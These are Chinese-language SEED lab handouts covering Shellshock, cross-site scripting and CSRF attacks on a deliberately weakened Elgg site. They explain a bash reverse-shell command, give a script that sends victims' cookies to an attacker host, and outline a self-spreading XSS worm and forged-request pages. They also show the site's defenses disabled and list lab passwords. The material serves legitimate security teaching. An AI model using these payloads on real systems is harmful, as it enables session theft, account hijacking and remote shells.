<p>“0&lt;&amp;1”: 文件描述符 0 表示标准输入设备 stdin。此选项告诉系统使用标准输出设备作为标准输入设备。由于标准输出已经被重定向到 TCP 连接，因此标准输入也用同一个 TCP 连接。</p>
</li>
<li>
<p>“2&gt;&amp;1”: 文件描述符 2 表示标准错误 stderr。这使得错误输出也被重定向到同一个 TCP 连接。</p>
</li>
</ul>
<p>总之，命令 “/bin/bash -i &gt; /dev/tcp/10.0.2.6/9090 0&lt;&amp;1 2&gt;&amp;” 在服务器机器上启动了 bash 程序，它的输入来自一个 TCP 连接，输出也发送到相同的 TCP 连接。当我们在 10.0.2.5 上执行这条 bash 命令时，它会回连到 10.0.2.6 上运行的 netcat 进程。通过 netcat 显示的 “Connection received on 10.0.2.5...”，我们可以确认这点。</p>

========================================
文件路径: .\Shellshock攻击实验\提交\summary.html
========================================

<p>你需要提交一份带有截图的详细实验报告来描述你所做的工作和你观察到的现象。你还需要对一些有趣或令人惊讶的观察结果进行解释。请同时列出重要的代码段并附上解释。只是简单地附上代码不加以解释不会获得分数。</p>

========================================
文件路径: .\Shellshock攻击实验\概述\summary.html
========================================

<p>2014年9月24日，bash 中的一个严重漏洞被发现了。这个漏洞被称为 Shellshock，很多系统受到影响。在本实验中，我们需要进行这个攻击，以便深入了解 Shellshock 漏洞。这个实验的学习目标是通过亲身体验这个有趣的攻击，理解它是如何工作的，并思考从中可以得到的教训。本实验包含以下主题：</p>
<ul>
<li>
<p>Shellshock</p>
</li>
<li>
<p>环境变量</p>
</li>
<li>
<p>bash 中的函数定义</p>
</li>
<li>
<p>Apache 和 CGI 程序</p>
</li>
</ul>
<div>
<div>关于 Shellshock 攻击的详细指导可以在网上或 SEED 书中找到，我们不会在实验描述中重复这些内容。</div>
</div>

========================================
文件路径: .\Shellshock攻击实验\问题\summary.html
========================================

<p>请回答以下问题：</p>
<ul>
<li>
<p>问题 1: 你能否从服务器窃取 /etc/shadow 文件的内容？为什么或者为什么不行？ 任务3.B 中获得的信息应该能给你一些线索。</p>
</li>
<li>
<p>问题 2: HTTP GET 请求通常会在 URL 中附加数据，放在? 标记后面。我们可以试着用这些数据来发起攻击。在以下示例中，我们在 URL 中附加了一些数据，我们发现这些数据被用来设置成环境变量：</p>
</li>
</ul>
<pre class="language-markup"><code>$ curl "http://www.seed-server.com/cgi-bin/getenv.cgi?AAAAA"
...
QUERY_STRING=AAAAA
...</code></pre>
<p>我们能否使用这种方法发起 Shellshock 攻击？请进行你的实验，并根据实验结果得出结论。</p>

========================================
文件路径: .\跨站脚本（XSS）攻击实验\Elgg的防范措施\summary.html
========================================

<div>这部分的内容仅供参考，并无特定任务。它展示了 Elgg 如何防御 XSS 攻击。Elgg 确实有内置的防范措施，但我们已经关掉了这些措施以便攻击成功。Elgg 使用了两种防范措施。一个是安全插件 HTMLawed，它可以验证用户输入并从中删除危险的内容。我们已经在 input.php 文件中的 filter_tags() 函数内部注释掉了对插件的调用，该文件位于 vendor/elgg/elgg/engine/lib/ 目录下。请参见以下内容：</div>
<div>
<pre class="language-markup"><code>function filter_tags($var) {
   // return elgg_trigger_plugin_hook('validate', 'input', null, $var);
   return $var;
}</code></pre>
</div>
<p></p>
<div>除了 HTMLawed，Elgg 还使用了 PHP 内置的 htmlspecialchars() 来对用户输入中的特殊字符进行编码。例如，将 "&lt;" 变成 "&amp;lt", "&gt;" 变成 "&amp;gt" 等。这种方法在 dropdown.php, text.php 和 url.php 文件中被调用（这些文件位于 vendor/elgg/elgg/views/default/output/ 目录下）。我们注释掉了它们，以关闭防范措施。</div>
<div> </div>
<div>抵御 XSS 攻击的更通用的方法是使用<span style="text-align: initial;">内容安全策略（CSP，Content Security Policy）。关于 CSP，我们有一个专门的实验。</span></div>

========================================
文件路径: .\跨站脚本（XSS）攻击实验\任务1：发布恶意消息以显示警告窗口\summary.html
========================================

<div>
<div>本任务的目标是在你的 Elgg 个人资料中嵌入一个 JavaScript 程序，使得当其他用户查看你的个人资料时，JavaScript 程序会被执行，在屏幕上弹出一个警告窗口。以下的 JavaScript 程序会显示一个警告窗口：</div>
<div>
<pre class="language-markup"><code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code></pre>
</div>
<div>如果你在个人资料中（例如简短描述字段）嵌入了上述 JavaScript 代码，那么任何查看你资料的人都会在屏幕上看到警告窗口。</div>
<br>
<div>在上面的例子里，JavaScript 代码很短，可以直接放在简短描述字段。如果你想运行一个较长的 JavaScript 程序，但受限字段长度的限制，你可以将该程序放在一个网站，然后通过 src 属性装载它。以下是一个例子：</div>
<div>
<pre class="language-markup"><code>&lt;script type="text/javascript"
        src="http://www.example.com/myscripts.js"&gt;
&lt;/script&gt;</code></pre>
</div>
<div>在这个例子中，页面将从 http://www.example.com 获取 JavaScript 程序，这可以是任何 web 服务器。</div>
</div>

========================================
文件路径: .\跨站脚本（XSS）攻击实验\任务2：显示受害者的Cookie\summary.html
========================================

<div>
<div>本任务的目标是在你的 Elgg 资料中嵌入一个 JavaScript 程序，使得当其他用户查看你的个人资料时，会在警告窗口中显示该用户的 cookie。这可以在上一步程序的基础上添加一些额外的代码来实现：</div>
<div>
<pre class="language-markup"><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></pre>
</div>
</div>

========================================
文件路径: .\跨站脚本（XSS）攻击实验\任务3：从受害者的机器窃取Cookie\summary.html
========================================

<div>
<div>在前一个任务中，攻击者编写的恶意 JavaScript 程序可以打印出用户的 cookie，但只有用户能看见这些 cookie，而攻击者不能。在本任务中，攻击者希望将这些 cookie 发送到自己那里。为此，恶意 JavaScript 需要向攻击者的机器发送一个 HTTP 请求，并在请求中附带 cookie。</div>
<br>
<div>我们可以让恶意 JavaScript 在网页中插入一个 &lt;img&gt; 标签来实现这一点，其 src 属性设置为攻击者的机器地址。当 JavaScript 插入 img 标签时，浏览器会从 src 字段中指定的 URL 那里下载图像。这会产生一个 HTTP GET 请求，发送到攻击者机器。以下给出的 JavaScript 会往攻击者的机器（IP 地址 10.9.0.1）上的端口 5555 处发送 cookie，而那里运行着一个 TCP 服务器。</div>
<pre class="language-markup"><code>&lt;script&gt;document.write('&lt;img src=http://10.9.0.1:5555?c='
                       + escape(document.cookie) + '   &gt;');
&lt;/script&gt;</code></pre>
<br>
<div>Netcat（或 nc）是攻击者常用的一个工具。运行带有 -l 选项时，它会变成一个监听指定端口的 TCP 服务器。这个服务器会打印出客户端发来的信息，并将用户输入的内容发回给客户端。以下的命令监听端口 5555 ：</div>
<div>
<pre class="language-markup"><code>$ nc -lknv 5555</code></pre>
</div>
<div>选项 -l 指定 nc 运行一个服务器；选项 -n 使 nc 不对地址做 DNS 解析；选项 -v 使 nc 输出更详细的信息；选项 -k 表示当一次连接完成后，继续等待其他连接。</div>
</div>

========================================
文件路径: .\跨站脚本（XSS）攻击实验\任务4：成为受害者的“好友”\summary.html
========================================

<div>在这个任务和下一个任务中，我们将执行类似于 Samy 在 2005 年对 MySpace 所做的攻击（即 Samy 蠕虫）。我们将编写一个 XSS 蠕虫，使得任何访问 Samy 页面的用户都会自动将 Samy 添加为好友。这个蠕虫先不会自我传播，在后面的任务中，我们会实现自我传播。</div>
<p></p>
<div>在这个任务中，我们需要编写一个恶意 JavaScript 程序，直接从受害者的浏览器发出“添加好友”的 HTTP 请求，从而将 Samy 添加为受害者的好友。我们已经在 Elgg 服务器上创建了一个名为 Samy 的用户（用户名为 samy）。</div>
<p></p>
<div>要为受害者添加朋友，首先需要弄清楚在 Elgg 中用户是如何合法添加好友的。更具体地说，我们需要知道当用户添加好友时都发送了什么信息到服务器。我们可以使用 Firefox 的 HTTP 检查工具来获取这些信息，它可以显示浏览器发送的任何 HTTP 请求的内容。从内容中我们可以识别出请求中的所有参数。</div>
<p></p>
<div>了解了添加好友时的 HTTP 请求后，我们可以通过编写一个 JavaScript 程序来发出相同的 HTTP 请求。我们提供了一个 JavaScript 代码框架。</div>
<div>
<pre class="language-markup"><code>&lt;script type="text/javascript"&gt;
window.onload = function () {
  var Ajax=null;

  var ts="&amp;__elgg_ts="+elgg.security.token.__elgg_ts;          🅰
  var token="&amp;__elgg_token="+elgg.security.token.__elgg_token; 🅱

  // 构建添加 Samy 为好友的 HTTP 请求。
  var sendurl=...;  //FILL IN

  // 创建并发送 Ajax 请求，以添加好友
  Ajax=new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
}
&lt;/script&gt;</code></pre>
</div>
<div>上述代码应放置在 Samy 个人资料（profile）页面的 "About Me" 字段中。这个字段提供了两种编辑模式：编辑器模式（默认）和文本模式。使用编辑器模式时，编辑器会在输入的文本中添加额外的 HTML 代码，而使用文本模式时不会。我们不想向攻击代码添加任何额外的字符，因此我们需要选择文本模式。点击位于 "About Me" 字段顶部右侧的 "Edit HTML" 进入文本模式。</div>
<p></p>
<div><strong>问题。 </strong>请回答以下问题：</div>
<ul>
<li><strong>问题1</strong>： 解释第 🅰 行和第 🅱 行的目的，为什么它们是必要的？</li>
<li><strong>问题2：</strong> 如果 Elgg 应用程序仅提供编辑器模式，即你无法切换到文本模式，你能成功发起攻击吗？</li>
</ul>
<div> </div>
<p></p>

========================================
文件路径: .\跨站脚本（XSS）攻击实验\任务5：修改受害者的资料\summary.html
========================================

<div>本任务的目标是在受害者访问 Samy 页面时修改其资料。具体来说，要修改  "About Me" 字段的内容。我们将编写一个 XSS 蠕虫来完成此任务。这个蠕虫不具有自我传播能力。在任务 6 中，我们会加上自我传播的能力。</div>
<p></p>
<div>和前一个任务类似，我们需要编写一个恶意的 JavaScript 程序，直接从受害者的浏览器发起 HTTP 请求。我们首先需要了解合法用户是如何编辑或修改其个人资料的。具体来说，我们需要弄清楚构造修改用户资料的 HTTP POST 请求的方式。我们将使用 Firefox 的 HTTP 检查工具。一旦理解了修改个人资料的 HTTP POST 请求的格式，我们就可以编写一个 JavaScript 程序来发出相同的HTTP请求。我们提供了一个 JavaScript 代码框架。</div>
<pre class="language-markup"><code>&lt;script type="text/javascript"&gt;
window.onload = function(){
  // 获取 user name, user guid, Time Stamp __elgg_ts，和 Security Token __elgg_token
  var userName="&amp;name="+elgg.session.user.name;
  var guid="&amp;guid="+elgg.session.user.guid;
  var ts="&amp;__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&amp;__elgg_token="+elgg.security.token.__elgg_token;

  //构造URL的内容
  var content=...;     // 填空
  var samyGuid=...;    // 填空
  var sendurl=...;     // 填空

  if(elgg.session.user.guid!=samyGuid)           🅰
  {
     // 创建并发送AJAX请求，以修改个人资料
     var Ajax=null;
     Ajax=new XMLHttpRequest();
     Ajax.open("POST", sendurl, true);
     Ajax.setRequestHeader("Content-Type",  "application/x-www-form-urlencoded");
     Ajax.send(content);
  }
}
&lt;/script&gt;</code></pre>
<div>类似于任务 4，上述代码应放置在 Samy 的个人资料页面的  "About Me" 字段中，并且在输入上述 JavaScript 代码之前需要转换到文本模式。</div>
<p></p>
<div><strong>问题。</strong> 请回答以下问题：</div>
<div>
<ul>
<li><strong>问题3：</strong>为什么我们需要第 🅰 行？删除该行后再做攻击，报告并解释观察结果。</li>
</ul>
</div>

========================================
文件路径: .\跨站脚本（XSS）攻击实验\任务6：编写自我传播的XSS蠕虫\summary.html
========================================

<div>
<div>要成为真正的蠕虫，恶意 JavaScript 程序应该能够自动传播。每当一个用户查看受感染者的个人资料时，不仅这个用户的个人资料会被修改，蠕虫程序还会拷贝到该用户的个人资料中，使得这个用户也成为了蠕虫的携带者。这样，查看受感染个人资料的人越多，蠕虫传播得就越快。这与 Samy 蠕虫的机制相同：在 2005 年 10 月 4 日发布后的 20 小时内，超过一百万用户受到影响，使 Samy 成为当时历史上传播速度最快的病毒之一。</div>
<br>
<div>能够实现这一功能的 JavaScript 代码被称为"自我传播跨站脚本攻击蠕虫" 。在这个任务中，你需要实现这样一个蠕虫，它不仅会修改受害者的个人资料，并将用户 Samy 添加为受害者好友，还会将自身复制到受害者的个人资料中，使受害者变成一个攻击者。</div>
<br>
<div>为了实现自我传播，在恶意 JavaScript 程序修改受害者个人资料时应该将其自身复制到受害者的个人资料中。有几种方法可以实现这一点，我们讨论其中两种常见的方法。</div>
<br>
<div><strong>链接方法： </strong>如果蠕虫是通过 &lt;script&gt; 标签的 src 属性来下载的，那么编写自我传播蠕虫会容易得多。我们已在任务1中讨论了 src 属性，并给出了一个例子。蠕虫可以简单地将以下 &lt;script&gt; 标签复制到受害者的个人资料中就可以了。</div>
<div>
<pre class="language-markup"><code>&lt;script type="text/javascript" src="http://www.example.com/xss_worm.js"&gt;
&lt;/script&gt;</code></pre>
</div>
<br>
<div><strong>DOM方法：</strong>如果整个JavaScript程序（即蠕虫）被嵌入在受感染的个人资料中，为了传播蠕虫到另一个个人资料，蠕虫代码可以使用 DOM API 从网页中找到其自身的代码。下面给出一个使用 DOM API 的例子。这段代码会获取自身代码的一个副本，并在警告窗口中显示它：</div>
<div>
<pre class="language-markup"><code>&lt;script id="worm"&gt;
   var headerTag = "&lt;script id=\"worm\" type=\"text/javascript\"&gt;"; 🅰
   var jsCode = document.getElementById("worm").innerHTML;          🅱
   var tailTag = "&lt;/" + "script&gt;";                                  🅲
   
   var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 🅳
     
   alert(jsCode);
&lt;/script&gt;</code></pre>
</div>
<div>需要注意的是，第 🅱 行仅提供代码的内部部分，并未包含周围的 &lt;script&gt; 标签。我们只需要添加开始标签 &lt;script id="worm"&gt;（行 🅰）和结束标签 &lt;/script&gt;（行 🅲），以形成一个完整的恶意代码副本。</div>
<br>
<div>当 HTTP POST 请求里的 Content-Type 被设置为 application/x-www-form-urlencoded 时， 数据也应进行编码。编码方案称为 URL encoding，它将数据中的非字母数字字符替换为百分号和两位十六进制数字表示的 ASCII 码。行 🅳 中的 encodeURIComponent() 函数用于对字符串进行 URL 编码。</div>
<br>
<div><strong>注意事项：</strong> 在本次实验中，你可以尝试使用链接方法和 DOM 方法两种方式，但 DOM 方法是必须做的，因为它更具挑战性且不依赖于外部 JavaScript 代码。</div>
</div>

========================================
文件路径: .\跨站脚本（XSS）攻击实验\实验环境\summary.html
========================================

<p></p>
<div>
<div><strong>Elgg 应用程序。</strong>在这个实验中，我们使用一个开源 web 应用程序 Elgg。Elgg 是一个基于网络的社交网络应用程序，并且已经设置在提供的容器镜像中。我们使用两个容器：一个是运行 web 服务器 (10.9.0.5)，另一个是运行 MySQL 数据库 (10.9.0.6)。这两个容器的 IP 地址已经用在了配置中，因此请不要在 docker-compose.yml 文件中改变它们。</div>
</div>
<div>
<div> </div>
<div><strong>DNS 配置。</strong>实验环境中 Elgg 的网站的URL 是 http://www.seed-server.com，我们需要把网站名 www.seed-server.com 映射到IP 地址 10.9.0.5。请在 /etc/hosts 中添加以下条目，你需要使用 root 权限来修改这个文件：</div>
<pre class="language-markup"><code>10.9.0.5        www.seed-server.com</code></pre>
<div>
<div> </div>
<div><strong>用户账户。</strong>我们在 Elgg 服务器上创建了几个用户账户，用户名和密码如下所示：</div>
<div>
<pre class="language-markup"><code>----------------------------
用户名     |   登录密码
----------------------------
admin     |  seedelgg
alice     |  seedalice
boby      |  seedboby
charlie   |  seedcharlie
samy      |  seedsamy
----------------------------</code></pre>
</div>
</div>
<br>
<div>
<div>
<div><strong>MySQL 数据库。</strong>容器通常是一次性的，因此一旦销毁，容器内的所有数据都会丢失。对于本实验，我们确实希望将数据保留在 MySQL 数据库中，这样在关闭容器时就不会丢失数据。为了实现这一点，我们将主机上的 mysql_data 文件夹挂载到 MySQL 容器内的 /var/lib/mysql 文件夹（此文件夹是 MySQL 存储数据库的地方）。因此，即使容器被销毁，数据库中的数据仍会保留。这个 mysql_data 文件夹在 Labsetup 内，它将在 MySQL 容器第一次运行后创建。如果您确实想从空的数据库开始，可以删除此文件夹：</div>
<div>
<pre class="language-markup"><code>$ sudo rm -rf mysql_data</code></pre>
</div>
</div>
</div>
</div>

========================================
文件路径: .\跨站请求伪造（CSRF）攻击实验\任务1：观察HTTP请求\summary.html
========================================

<div>
<div>在跨站请求伪造攻击中，我们需要伪造 HTTP 请求。因此，我们需要了解一个合法的 HTTP 请求长什么样以及它使用了哪些参数等信息。我们可以通过 Firefox 的扩展程序 "HTTP Header Live" 来实现这一目标。本任务的目标是熟悉此工具。有关如何使用此工具的具体说明请参见指导部分。请使用此工具捕获 Elgg 的 HTTP GET 和 POST 请求。在您的报告中，请识别这些请求中使用的参数。</div>
</div>

========================================
文件路径: .\跨站请求伪造（CSRF）攻击实验\任务2：使用GET请求的CSRF攻击\summary.html
========================================

<div>在这个任务中，我们需要使用 Elgg 社交网络中有两个用户：Alice 和 Samy。Samy 想要成为 Alice 的好友，但 Alice 并不想将他加到自己的好友列表中。Samy 决定使用 CSRF 攻击来实现这个目标。他会通过邮件或在 Elgg 里给 Alice 发一个 URL。当 Alice 好奇点击该 URL 后，她会被引导至 Samy 的网站：www.attacker32.com。请假装你是 Samy，描述你如何构建网页内容，以便当 Alice 访问此页面后，Samy 就会成为 Alice 好友列表中的成员（假设 Alice 当前的 Elgg 会话还是有效的）。</div>
<p></p>
<div>为了给受害者添加好友，我们需要知道合法的"添加好友"的 HTTP 请求（GET 请求）是什么样的。我们可以使用  "HTTP Header Live" 工具进行调查。在这个任务中，不允许编写 JavaScript 代码来发动 CSRF 攻击。你的工作是当 Alice 访问页面后攻击会立即发动，Alice 无需在页面上点击任何内容。下面例子中的 img 标签会自动触发一个 HTTP GET 请求。你需要在 www.attacker32.com 网站服务器上建一个攻击的页面，这个页面应该放在攻击者容器的  <span style="text-align: initial;">/var/www/attacker 目录下，但我们已经把主机上的 Labsetup/attacker 文件夹挂载到了攻击者容器的 /var/www/attacker 文件夹上，所以在主机上的 Labsetup/attacker 里建网页就可以了。</span></div>
<pre class="language-markup"><code>&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;This page forges an HTTP GET request&lt;/h1&gt;
&lt;img src="" alt="image" width="1" height="1" /&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<div>Elgg 实现了一种防御 CSRF 攻击的措施。在"添加好友"的 HTTP 请求中，您可能会注意到每个请求都包含了两个看起来很奇怪的参数，即 __elgg_ts 和 __elgg_token。这两个参数用于此防护措施，如果它们的值不正确，Elgg 则不会接受该请求。我们在本实验中关闭了这种防御措施，因此在伪造请求时无需包括这两个参数。</div>
<p></p>
<div><strong>重要说明： </strong>如果你使用的是云虚拟机或非 SEED 的其他虚拟机，您的 VM 中的 Firefox 版本可能较新，并且可能会对跨站 cookie 采取一些限制。在较新的版本中，使用 img 标签来伪造 HTTP GET 请求将无法使攻击成功。这是因为浏览器对这类请求会阻止跨站 cookie。如果您遇到这种情况，您可以选择以下方法之一使攻击生效：</div>
<ul>
<li>不使用 img 标签，而是使用其他方式生成 GET 请求。例如，在下一个任务中我们使用 JavaScript 来伪造 POST 请求。我们可以使用相同的方法来伪造 GET 请求。</li>
<li>更改 Firefox 设置以取消这些限制。学生需要找出应该取消哪个限制条款。该限制设置在“隐私与安全”页面上，可以通过在 URL 场景中输入 about:preferences#privacy 来查看。</li>
</ul>
<div>如果你使用的是我们提供的 SEEDUbuntu 20.04 虚拟机，则此方法仍然有效，除非您已将 Firefox 升级到较新的版本。</div>

========================================
文件路径: .\跨站请求伪造（CSRF）攻击实验\任务3：使用POST请求的CSRF攻击\summary.html
========================================

<div>在成功地将自己添加到 Alice 的好友列表后，Samy 想要做更多的事情。他希望 Alice 在她的个人资料中写着：“Samy is my hero“。Alice 并不喜欢 Samy，更不用提把这句话放到她的个人资料中了。Samy 计划使用 CSRF 攻击来实现这个目标，这也是本任务的目的。</div>
<p></p>
<div>一种攻击的方法是给 Alice 的 Elgg 帐户发一条消息发，希望她点击该消息中的 URL。这个 URL 会引导 Alice 来到 Samy（即你）的恶意网站 www.attacker32.com，在那里你可以发动 CSRF 攻击。和上一个任务一样，你需要在恶意网站放一个攻击的页面。</div>
<p></p>
<div>你的攻击目标是修改受害者的个人资料。具体来说，攻击者需要伪造一个请求来修改 Elgg 中受害用户的个人资料信息。允许用户自行修改个人资料是 Elgg 的功能之一。如果用户想要修改自己的个人资料，他们可以访问 Elgg 的个人资料页面，填写表格，并提交表单到服务器脚本中，也就是发送一个 POST 请求到 /profile/edit.php，该脚本会处理请求并执行个人资料的修改。</div>
<p></p>
<div>服务器端脚本 edit.php 同时接受 GET 和 POST 请求，因此你可以使用与任务 1 中相同的方法来实现攻击。然而，在这个任务中，你需要使用 POST 请求。即，当受害者访问其恶意站点时，攻击者（也就是你）需要伪造一个来自受害者浏览器的 HTTP POST 请求。攻击者需要了解此类请求的结构。通过对个人资料进行一些修改并使用 "HTTP Header Live" 工具来监控请求，你可以观察到和下面类似的请求。与 GET 请求将参数附加在 URL 字符串中不同，POST 请求中的参数包含在 HTTP 消息体中（见两个 ★ 符号之间的内容）：</div>
<div>
<pre class="language-markup"><code>http://www.seed-server.com/action/profile/edit

POST /action/profile/edit HTTP/1.1
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) ...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.seed-server.com/profile/elgguser1/edit
Cookie: Elgg=p0dci8baqrl4i2ipv2mio3po05
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 642
__elgg_token=fc98784a9fbd02b68682bbb0e75b428b&amp;__elgg_ts=1403464813  ★
name=elgguser1&amp;description=%3Cp%3Iamelgguser1%3C%2Fp%3E
accesslevel%5Bdescription%5D=2&amp;briefdescription= Iamelgguser1
accesslevel%5Bbriefdescription%5D=2&amp;location=US
......                                                              ★</code></pre>
</div>
<p></p>
<div>理解了请求的结构之后，你需要在攻击页面里生成这样的请求。为了帮助你编写此类 JavaScript 程序，我们提供了一个示例代码。你可以使用此示例代码来构建 CSRF 攻击，但这只是个示例代码，你需要对其进行修改以使其适用于你的攻击。</div>
<div>
<pre class="language-markup"><code>&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;此页面伪造一个 HTTP POST 请求。&lt;/h1&gt;
&lt;script type="text/javascript"&gt;

function forge_post()
{
    var fields;

    // 下面是攻击者需要填写的表单输入项。这些条目是隐藏的，受害者看不到。
    fields += "&lt;input type='hidden' name='name' value='****'&gt;";
    fields += "&lt;input type='hidden' name='briefdescription' value='****'&gt;";
    fields += "&lt;input type='hidden' name='accesslevel[briefdescription]'
                                    value='2'&gt;";          🅰
    fields += "&lt;input type='hidden' name='guid' value='****'&gt;";

    // 创建一个 &lt;form&gt; 元素。
    var p = document.createElement("form");

    // 构造表单
    p.action = "http://www.example.com";
    p.innerHTML = fields;
    p.method = "post";

    // 将表单添加到当前页面中。
    document.body.appendChild(p);

    // 提交表单
    p.submit();
}

// 页面加载后会调用 forge_post() 函数。
window.onload = function() { forge_post();}
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
</div>
<div>在行 🅰，值  2 将字段的访问级别设置为公开，这是必须的，否则默认情况下该字段将被设为私有，其他用户则无法看到此字段。需要注意的是，在从其它类型 文件中复制和粘贴上述代码时，程序中的单引号字符可能变成了其他符号（但仍然看起来像单引号）。这会导致语法错误。用你的键盘输入的单引号替换所有这些符号将解决这些问题。</div>
<div> </div>
<div><strong>问题：</strong>除了详细描述你的攻击外，你还需要在报告中回答以下问题：</div>
<ul>
<li><strong>问题 1：</strong>伪造的 HTTP 请求需要 Alice 的用户 ID（guid）才能正常工作。如果 Boby 特别针对 Alice 发动攻击，在发动攻击前他可以想办法来获取 Alice 的用户 ID。Boby 不知道 Alice 在 Elgg 中的密码，因此无法登录到 Alice 的帐户以获取相关信息。请描述 Boby 如何解决这个问题。</li>
<li><strong>问题 2：</strong>如果 Boby 想要修改访问他的恶意网页的任何人的 Elgg 个人资料，在事先并不知道谁会访问的情况下还可以发起 CSRF 攻击吗？请解释。</li>
</ul>
<p></p>

========================================
文件路径: .\跨站请求伪造（CSRF）攻击实验\任务4：启用Elgg的防护措施\summary.html
========================================

<div>
<div>为了防御 CSRF 攻击，Web 应用程序可以将秘密令牌嵌入到页面中。所有来自这些页面的请求都必须携带此令牌，否则会被视为跨站请求，不会具有和同源请求相同的权限。攻击者无法获取此秘密令牌，因此他们的请求很容易被识别为跨站请求。</div>
<br>
<div>Elgg} 使用这种秘密令牌方法作为其内置的防护措施来防御 CSRF 攻击。我们已经关闭了这些防护措施以使攻击生效。 Elgg 在请求中嵌入了两个参数 __elgg_ts 和 __elgg_token。服务器在处理请求前会验证它们。</div>
<br>
<div><strong>将秘密令牌和时间戳嵌入到网页中：</strong>Elgg 在所有需要用户操作的地方都添加了安全令牌和时间戳。以下 HTML 代码出现在所有的表里。这两个隐藏字段会在表单提交时被附加到请求中：</div>
<div>
<pre class="language-markup"><code>&lt;input type = "hidden" name = "__elgg_ts" value = "" /&gt;
&lt;input type = "hidden" name = "__elgg_token" value = "" /&gt;</code></pre>
</div>
<br>
<div>Elgg 还将安全令牌和时间戳的值赋给 JavaScript 变量，以便页面上的 JavaScript 代码可以轻松访问这些变量。</div>
<pre class="language-markup"><code>elgg.security.token.__elgg_ts;
elgg.security.token.__elgg_token;</code></pre>
<br>
<div>在 Elgg} 的网页中添加安全令牌和时间戳是通过 vendor/elgg/elgg/views/default/input/securitytoken.php 来实现的。下面的代码片段展示了这些内容是如何动态地添加到页面上的。</div>
<pre class="language-markup"><code>$ts = time();
$token = elgg()-&gt;csrf-&gt;generateActionToken($ts);

echo elgg_view('input/hidden', ['name' =&gt; '__elgg_token', 'value' =&gt; $token]);
echo elgg_view('input/hidden', ['name' =&gt; '__elgg_ts', 'value' =&gt; $ts]);</code></pre>
<br>
<div><strong>秘密令牌的生成。</strong>Elgg 的安全令牌是下面信息产生的哈希值：网站提供的秘密值，时间戳、用户会话 ID 和随机生成的会话字符串。下面的代码展示了 Elgg 中的安全令牌的生成过程（在 vendor/elgg/elgg/engine/classes/Elgg/Security/Csrf.php 中）。</div>
<pre class="language-markup"><code>/**
 * 从会话令牌、时间戳和站点密钥生成一个令牌。
 */
public function generateActionToken($timestamp, $session_token = '') {
  if (!$session_token) {
          $session_token = $this-&gt;session-&gt;get('__elgg_session');
          if (!$session_token) {
                  return false;
          }
  }

  return $this-&gt;hmac
          -&gt;getHmac([(int) $timestamp, $session_token], 'md5')
          -&gt;getToken();
}</code></pre>
<br>
<div><strong>秘密令牌验证。</strong> Elgg} 网站会验证生成的令牌和时间戳以防御 CSRF 攻击。每当用户执行某个操作时，都会调用 Csrf.php 中的 validate() 函数，此函数会对这些令牌进行验证。如果令牌不存在或无效，则将拒绝该操作并将用户重定向到其他页面。我们在该函数开始添加了一个 return 语句，从而禁用了这一功能。</div>
<pre class="language-markup"><code>public function validate(Request $request) {
   (*@\textbf{return;}@*) // 为 SEED 实验（禁用 CSRF 防护措施）而添加

    $token = $request-&gt;getParam('__elgg_token');
    $ts = $request-&gt;getParam('__elgg_ts');
    ... (省略了代码)
}</code></pre>
<br>
<div> </div>
<div><strong>任务：开启防护措施。</strong>为了启用防护措施，请进入 Elgg 容器，前往 /var/www/elgg/vendor/elgg/elgg/engine/classes/Elgg/Security 文件夹，从  Csrf.php 中删除 return 语句。容器内有一个简单的编辑器叫做 nano。在完成更改后，请重新运行攻击，并观察您的攻击是否成功。请指出捕获的 HTTP 请求中的秘密令牌。请解释为什么攻击者无法在 CSRF 攻击中发送这些秘密令牌；是什么阻止了他们从网页中找到这些秘密令牌？</div>
<br>
<div>需要注意的是（非常重要），当我们启用防护措施后进行CSRF攻击去修改个人资料时，攻击失败后攻击者的页面会被重新载入，这将再次触发伪造的 POST 请求。这会导致另一个失败的攻击，然后页面将继续被重新加载并发送出另一个伪造的 POST 请求。这种无限循环可能会导致您的计算机变慢。因此，在确认攻击失败后，请关闭页面以停止无限循环。</div>
</div>

========================================
文件路径: .\跨站请求伪造（CSRF）攻击实验\任务5：实验同源cookie方法\summary.html
========================================

<div>大多数浏览器现在都实现了一种称为"同源 cookie"的机制，这是与 cookie 相关的一个属性。当发送请求时，浏览器会检查这个属性，并决定是否在跨站请求中附加此 cookie。如果一个 Web 应用程序不希望某个 cookie 用于跨站请求，他们可以标记该 cookie 为同源。例如应用程序可以把 session ID cookie 设为同源 cookie，从而阻止任何跨站请求使用 session ID，因此无法发动 CSRF 攻击。</div>
<p></p>
<div>为了帮助学生了解如何利用同源 cookie 来防御 CSRF 攻击，我们在一个容器中创建了一个名为  www.example32.com 的网站。请访问以下 URL。我们已将主机名映射到 10.9.0.5。</div>
<div>
<pre class="language-markup"><code>URL: http://www.example32.com/</code></pre>
</div>
<div>一旦你访问过这个网站，你的浏览器将设置三个 cookie： cookie-normal,  cookie-lax 和 cookie-strict。如名称所示，第一个 cookie 是一个普通的 cookie；第二个和第三个是两种类型的同源 cookie（Lax 类型和 Strict 类型）。我们设计了两组实验来测试哪些 cookie 会被发送给服务器。</div>
<p></p>
<div>请点击网页中的链接。链接 A 指向 example32.com 的页面，而链接 B 则指向 attacker32.com 的页面。这两个页面内容是相同的（除了背景颜色），它们分别发送了三种不同类型的请求到 www.example32.com/showcookies.php，该页面仅仅显示浏览器发送的 cookie。通过查看显示结果，可以知道哪些 cookie 被发送。请完成以下任务：</div>
<div> </div>
<ul>
<li>  请描述你看到的内容并解释在某些场景下为何有些 cookie 不会被发送。</li>
<li>  根据你的理解，请描述同源 cookie 如何帮助服务器检测请求是跨站还是同源的。</li>
<li> 请描述如何使用同源 cookie 机制来帮助 Elgg 防御 CSRF 攻击。你只需描述一些基本想法，无需实现它们。</li>
</ul>
